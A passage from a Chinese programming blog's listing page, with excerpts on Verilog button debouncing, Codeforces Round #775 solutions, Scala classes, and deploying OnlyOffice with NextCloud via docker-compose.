一、独立按键消抖原理 按键一般是机械弹性开关，由于机械触点的弹性作用，机械触点断开、闭合时会伴随着一连串的抖动，这个抖动会使得按键输出的高低电平连续变化，而这并不是真正的按下按键，如果直接作为开关控制后续电路，就会造成电路的不稳定，因此，需要采用按键消抖。
机械按键按下时候有一个不稳定的抖动期，这个时间大概在20ms以内，我们可以利用这个20ms的抖动期，当检测到按键电平变化时20ms计数器重新计数，若计数器达到20ms，证明按键电平变化以后的20ms内没有再发生电平变化，可以认为是按键真正被按下，将此时的按键状态放入寄存器进而控制后续电路。
二、按键消抖程序实现（Verilog） 1.按键触发判断 只要有按键状态变化,20ms计数器就应重新开始计数。而判断按键状态是否变化应该比较按键前后两个状态，由此采用移位寄存器，缓存按键前后的状态，再进行逻辑运算判断按键被按下还是松开。 注意：只要有按键被按下就要采用延时20ms消抖，同时按键全被松开也会对应按键电平的变化，仍然要采用消抖
代码如下：
wire key ; //用于按键触发判断 reg[3:0] key_r ; //缓存标志key的信息 assign key = key_h[3]&amp;key_h[2]&amp;key_h[1]&amp;key_h[0] ; always@(posedge sys_clk_i or negedge ext_rst_n)begin if(!ext_rst_n) key_r &lt;= 4'b1111; else key_r &lt;= {key_r[2:0],key}; //左移寄存器，最低位保存按键最新的状态 end wire key_neg = key_r[3] &amp; ~key_r[2] ; //key_r[2]是现态，[3]是前一个状态，采用左移寄存器 wire key_pos = ~key_r[3] &amp; key_r[2] ;//按键全部被释放 2.计数器模块实现 由于FPGA系统时钟是50MHz，需要计数到20ms 20ms/20ns得到结果为1_000_000次，表示需要每一个时钟上升沿计数，从0开始计数，计数到999_999,二十进制换算，需要采用20bit的寄存器来保存计数次数。计数至20ms时应进行清零操作 //20ms计数，一旦出现按键按下或释放重新开始计数 reg[19:0]cnt ; always@(posedge sys_clk_i or negedge ext_rst_n)begin if(!ext_rst_n) cnt &lt;= 20'd0 ; else if(key_neg || key_pos ) cnt &lt;= 20'd0 ; else if(cnt == 20'd999_999) cnt &lt;= 20'd0 ; else cnt &lt;= cnt + 20'd1 ; end 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cacdc9dd0f3b825e29b798989627e7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad56f1d7f8777e5cbc46b1ed54a9010f/" rel="bookmark">
			Codeforces Round #775 (Div. 2, based on Moscow Open Olympiad in Informatics)A~C 题解(原来如此简单，超级详细入门必备)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		A. Game
题目传送门
题目理解：一个人要过河，这个人不会游泳，只能走陆地，一旦碰水就死翘翘，但是现在给你一个bug，只要你给x个硬币，你就可以传送到i+x块陆地上面，比如你在第5块土地上面，给5个硬币，那么你会出现在第10块土地上面。第一块和最后一块土地必然存在，求最少花硬币的数量。
解题思路：不能碰水，第一块和最后一块总是存在，那就从头到尾和从尾到头开始分别遍历，最后处理这两个变量就好
关键代码：
l=1;r=n; while(a[l]==1&amp;&amp;l&lt;=n)l++; while(a[r]==1&amp;&amp;r&gt;=1)r--; 最后a[l]==0，a[r]==0。
源代码：
//#include&lt;bits/stdc++.h&gt; #include&lt;iostream&gt; #include&lt;algorithm&gt; #include&lt;cmath&gt; #include&lt;string&gt; #include&lt;string.h&gt; #include&lt;stdio.h&gt; #include&lt;deque&gt; #include&lt;queue&gt; #include&lt;map&gt; #include&lt;stack&gt; #include&lt;vector&gt; #include&lt;set&gt; #define int long long #define endl '\n' #define rg register int #define fe(i,a,b) for(i = a ; i &lt;= b ; ++ i) #define de(i,a,b) for(i = a ; i &gt;= b ; -- i) #define pb push_back #define lb lower_bound #define ub upper_bound #define all(x) (x).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad56f1d7f8777e5cbc46b1ed54a9010f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89baf8201dafc3282bda14f33f156f99/" rel="bookmark">
			Scala05：Scala面向对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Scala面向对象编程 在这里我们主要学习Scala中的类、对象和接口
注意：
Scala中类和java中的类基本是类似的
Scala中的对象时需要定义的，而java中的对象是通过class new出来的
Scala中的接口是trait，java中的接口是interface
二、类-class 首先看一下类
Scala中定义类和Java一样，都是使用 class 关键字
和Java一样，使用new关键字创建对象
那下面来看一个具体案例
定义Person类，创建对象并调用其方法
class Person{ var name = "scala" def sayHello(){ println("Hello,"+name) } def getName= name } 注意：如果在定义方法的时候指定了()，那么在调用的时候()可写可不写，如果在定义方法的时候没指定()，则调用方法时肯定不能带() 1、constructor 类创建好了，下面我们来看一下类中的构造函数，
Scala类中的构造函数可以分为主构造函数和辅助构造函数
这两种构造函数有什么区别呢？
主constructor：类似Java的默认构造函数 this()
辅助constructor：类似Java的重载构造函数 this(name,age)
2、主constructor 那先来看一下主构造函数
Scala的主constructor是与类名放在一起的，与Java不同，Java中的构造函数是写在类内部的
注意：在类中，没有定义在任何方法或者是代码块之中的代码就是主constructor的代码 上代码：
先定义一个Student类
class Student(val name:String,val age:Int){ println("your name is " + name + ", your age is " + age) } 创建对象
在创建对象的时候，类中的println语句执行了，说明这个语句属于主构造函数中的代码
主constructor中还可以通过使用默认参数，来给参数设置默认值
class Student(val name:String = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89baf8201dafc3282bda14f33f156f99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1b2dd465cbf59bb22876bca4707ddf4/" rel="bookmark">
			Docker使用docker compose实现 NextCloud私人网盘整合在线Offcie软件 onlyoffice安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		-&gt; Docker及docker compose的安装点这里
-&gt; docker compose部署NextCloud点这里
创建 docker-compose.yml 文件
version: '3' services: only-office: image: onlyoffice/documentserver container_name: only-office ports: - 9007:80 volumes: - ./app/data:/var/www/onlyoffice/Data - ./app/log:/var/log/onlyoffice restart: always privileged: true 在docker-compose.yml文件目录下运行 docker-compose up -d
docker-compose up -d docker-compose logs -f 查看日志信息
启动比较慢，需要等待一会，提示信息可以忽略
输入网址查看是否启动成功：http://IP地址:9007/welcome/
整合NextCloud：
打开NextCloud的界面，添加应用
找到ONLYOFFICE应用，点击添加
也有可能在这
这里就是你登录NextCloud的密码
点击进入设置页面，会发现多了一个ONLYOFFICE的选项
如果没有找到，可以去看一下是不是被禁用了
最后，把我们刚刚部署好的ONLYOFFICE服务的地址添加进去，保持即可
添加文件测试一下
ONLYOFFICE整合成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9de5ad5869053718ef8999f94c8da796/" rel="bookmark">
			洛谷:P5728 【深基5.例5】旗鼓相当的对手---(6)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本题耗时(4h42min+) ---- 这道题告诉我们定义变量一定要初始化 尤其是数组 两个地方卡了好久
1. 每个人可以和多个人比较
2. 数组的初始化 初始化 初始化 ~!!!!!!!!!!
经过和 wjx兄弟的讨论优化 代码如下:
#include &lt;iostream&gt; #include &lt;cmath&gt; using namespace std; int main() { int N = 0; // 同学数 int i = 0; int j = 0; int k = 0; int flag = 0; int a[1001][5] = {0}; // 将成绩综合 放到 第 4 列 cin &gt;&gt; N; for (i=0; i&lt;N; i++) //输入 { for (j=0; j&lt;3; j++) { cin &gt;&gt; a[i][j]; a[i][4] += a[i][j]; } }	int cnt = 0;	for (i=0; i&lt;N; i++)	//判断 {	for (k=i+1; k&lt;N; k++) {	flag = 0;	for (j=0; j&lt;3; j++) { if (abs(a[i][j]-a[k][j]) &gt; 5) { break;	} flag++; } if (flag==3 &amp;&amp; abs(a[i][4]-a[k][4])&lt;=10) { cnt++; } } } cout &lt;&lt; cnt; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb29c3de871ba7885d5dd679e3ca60b7/" rel="bookmark">
			Codeforces Round #775 A-D
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总体来说，这场比赛题目好，但是因为很多小的优化没学到，所以C寄了一发，最后机房提前二十分钟关门，D算是寄了。
A. Game
题意：给定一个长度为n的01串，如果是连着的1可以直接走，如果是0可以跳过，当然1也可以跳过，跳过的长度即为花费，问从头走到尾如果只跳一次需要多少花费。
思路：注意读题，只能跳一次，所以只要需要跳，必然是一次性跳过所有的0，直接模拟就好了
#include &lt;bits/stdc++.h&gt; using namespace std; int main() { int t,n,temp,pos1=0,pos2=0; for(cin&gt;&gt;t;t;t--) { cin&gt;&gt;n; pos1=0,pos2=0; for(int i=1;i&lt;=n;i++) { cin&gt;&gt;temp; if(!temp&amp;&amp;!pos1) pos1=i; if(!temp) pos2=i; } if(pos2==0) cout&lt;&lt;0&lt;&lt;endl; else cout&lt;&lt;pos2-pos1+2&lt;&lt;endl; } return 0; } B - Game of Ball Passing
题意：n个人互相传球，每个人传球的次数已知，问他们最少用了多少个球。
思路：用最大的传球次数减去所有的，小于等于0就只用了一个球，否则就输出剩下的
#include &lt;iostream&gt; #include &lt;bits/stdc++.h&gt; using namespace std; #define N 1000000+100 long long a[N]; int main() { int t; for(cin&gt;&gt;t;t;t--) { int n; cin&gt;&gt;n; for(int i=1;i&lt;=n;i++) cin&gt;&gt;a[i]; sort(a+1,a+n+1); if(a[n]==0) { cout&lt;&lt;0&lt;&lt;endl; continue; } for(int i=n-1;i&gt;=1;i--) a[n]-=a[i]; if(a[n]&lt;=0) cout&lt;&lt;1&lt;&lt;endl; else cout&lt;&lt;a[n]&lt;&lt;endl; } return 0; } C - Weird Sum
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb29c3de871ba7885d5dd679e3ca60b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4b9fd6cec3fffb350ea9e6c275c0cd1/" rel="bookmark">
			【记录CF】Codeforces Round #775 (Div. 2) A~C 题解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
杂谈
A. Game
B. Game of Ball Passing
C. Weird Sum
杂谈 这场A题读题读假了，直接崩掉，一开始以为能一直跳，就去算每两块连续陆地之间的差值了，交了一发WA了，又仔细地读了一遍题，才看到那里加粗了几个词，no more than once jump......
B题推出来答案为 0 和为 1 的情况，然后卡在了计算不为 1 的情况上（讲道理自己给自己搞复杂了，还去计算了每两个人之间的差值），后来发现剩下的情况的答案就是最多的次数减去剩下的次数和。
C题发现性质后又卡在了怎么求每对之间的横、纵距离值，写出来之后答案怎么都不对，最后发现还是式子写错了，极限修改......
总之这场自己出了各种问题，不说了，继续训练......
A. Game 题目链接：Problem - A - Codeforces
题目大意：给定一个序列，1代表陆地，0代表水，如果陆地相邻可以直接走过去，如果中间隔着水，那可以消耗两个陆地之间的距离的硬币数进行跳跃，只能进行一次跳跃，问从最左端到达最右端的最小花费硬币数是多少。
解题思路：注意只能进行一次跳跃，那么只需要判断左边和右边陆地最多连续到第几个位置，进行相减就是最小花费硬币数。
AC代码：
#include &lt;bits/stdc++.h&gt; #define lowbit(x) (x &amp; -x) #define mid (l + r &gt;&gt; 1) using namespace std; typedef long long ll; const int INF = 0x3f3f3f3f; const int mod = 1000000007; const int N = 105; int a[N]; int main(){ //freopen("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4b9fd6cec3fffb350ea9e6c275c0cd1/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/259/">«</a>
	<span class="pagination__item pagination__item--current">260/516</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/261/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>